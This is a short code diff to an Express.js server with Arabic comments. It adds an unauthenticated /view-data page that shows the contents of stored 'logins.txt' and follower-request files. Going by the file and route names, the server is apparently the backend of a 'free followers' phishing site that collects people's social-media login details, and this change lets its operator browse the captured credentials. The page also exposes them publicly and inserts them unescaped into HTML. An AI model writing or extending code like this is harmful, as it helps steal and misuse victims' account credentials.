@@ -67,6 +67,62 @@ app.post("/followers-request", (req, res) => {
 // تقديم الملفات الثابتة من مجلد public
 app.use(express.static("public"));
 
+// إضافة نقطة نهاية لعرض البيانات
+app.get("/view-data", (req, res) => {
+  try {
+    // قراءة ملفات البيانات
+    const loginsPath = path.join(dataDir, "logins.txt");
+    const followersPath = path.join(dataDir, "followers-requests.txt");
+
+    let loginsData = "لا توجد بيانات تسجيل دخول";
+    let followersData = "لا توجد طلبات متابعين";
+
+    if (fs.existsSync(loginsPath)) {
+      loginsData = fs.readFileSync(loginsPath, "utf8");
+    }
+
+    if (fs.existsSync(followersPath)) {
+      followersData = fs.readFileSync(followersPath, "utf8");
+    }
+
+    // إرسال صفحة HTML تعرض البيانات
+    res.send(`
+      <!DOCTYPE html>
+      <html dir="rtl">
+      <head>
+        <meta charset="UTF-8">
+        <title>بيانات المستخدمين</title>
+        <style>
+          body { font-family: Arial; padding: 20px; background-color: #f5f5f5; }
+          h1 { color: #333; }
+          pre { background: #fff; padding: 15px; border-radius: 5px; direction: ltr; white-space: pre-wrap; }
+          .container { max-width: 800px; margin: 0 auto; background-color: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+          .data-section { margin-bottom: 30px; }
+        </style>
+      </head>
+      <body>
+        <div class="container">
+          <h1>بيانات المستخدمين المدخلة</h1>
+          
+          <div class="data-section">
+            <h2>بيانات تسجيل الدخول</h2>
+            <pre>${loginsData}</pre>
+          </div>
+          
+          <div class="data-section">
+            <h2>طلبات المتابعين</h2>
+            <pre>${followersData}</pre>
+          </div>
+        </div>
+      </body>
+      </html>
+    `);
+  } catch (err) {
+    console.error("خطأ في قراءة البيانات:", err);
+    res.status(500).send("حدث خطأ في قراءة البيانات");
+  }
+});
+
 // تشغيل الخادم
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
